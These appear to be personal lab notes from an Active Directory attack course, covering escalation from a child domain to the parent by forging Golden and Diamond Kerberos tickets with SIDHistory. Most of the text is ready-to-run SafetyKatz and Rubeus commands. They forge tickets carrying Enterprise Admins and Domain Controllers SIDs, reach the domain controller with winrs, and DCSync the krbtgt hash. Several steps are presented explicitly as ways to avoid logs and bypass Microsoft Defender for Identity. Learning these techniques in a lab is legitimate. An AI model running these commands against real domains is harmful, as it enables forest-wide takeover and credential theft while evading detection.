Instead of forging an inter-realm TGT, you can use the SIDHistory of the Enterprise Admins group to forge a Golden Ticket instead
- this method is easier to do

# Check "Avoid suspicious logs..." first


Due to the trust, the parent domain will trust the TGT
`SafetyKatz.exe "kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-... /sids:S-1-5-21-...-519 /krbtgt:<hash> /ptt" "exit"`
- SID with ...-519 is the SID of Enterprise Admins
- /sids (Enterprise Admins) is the only new flag from normal Golden Ticket attacks


Forge the Golden Ticket using Rubeus
`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:<comped_DOMAIN> /sid:S-1-5-21-... /sids:S-1-5-21-...-519 /aes256:<hash> /netbios:<DC_name> /ptt`
![Pasted image 20260224034621](assets/Pasted%20image%2020260224034621.png)
![Pasted image 20260224034609](assets/Pasted%20image%2020260224034609.png)

Access the DC with the Golden Ticket
`winrs -r:<target_DC_name> cmd`
![Pasted image 20260224034652](assets/Pasted%20image%2020260224034652.png)



Avoid suspicious logs and bypass MDI by using Domain Controller Identity
`SafetyKatz.exe "kerberos::golden /user:<DC_machine_acct> /id:<DC_id> /domain:<DOMAIN> /sid:S-1-5-21-... /sids:S-1-5-21-...-516,S-1-5-9 /krbtgt:<hash> /ptt" "exit"`
`SafetyKatz.exe "lsadump::dcsync /user<target_DOMAIN>\krbtgt /domain:<target_DOMAIN>" "exit"`
- S-1-5-21...-516 - Domain Controllers
	- in case the domain on the test is the same, the SID he used was `S-1-5-21-2578538781-2508153159-3419410681-516` (check video 42)
- S-1-5-9 - Enterprise Domain Controllers


Diamond ticket with SID History will avoid suspicious logs on child DC and parent DC. Also bypasses MDI
`Rubeus.exe diamond /krbkey:<key> /tgtdeleg /enctype:aes /ticketuser:<comped_DC_account> /domain:<DOMAIN> /dc:<DC_name>.<DOMAIN> /ticketuserid:1000 /sids:S-1-5-21-...-516,S-1-5-9 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`

`SafetyKatz.exe "lsadump::dcsync /user:<target_DOMAIN>\krbtgt /domain:<DOMAIN>" "exit"`
- in their example, user was `mcorp\krbtgt` in the `moneycorp.local` domain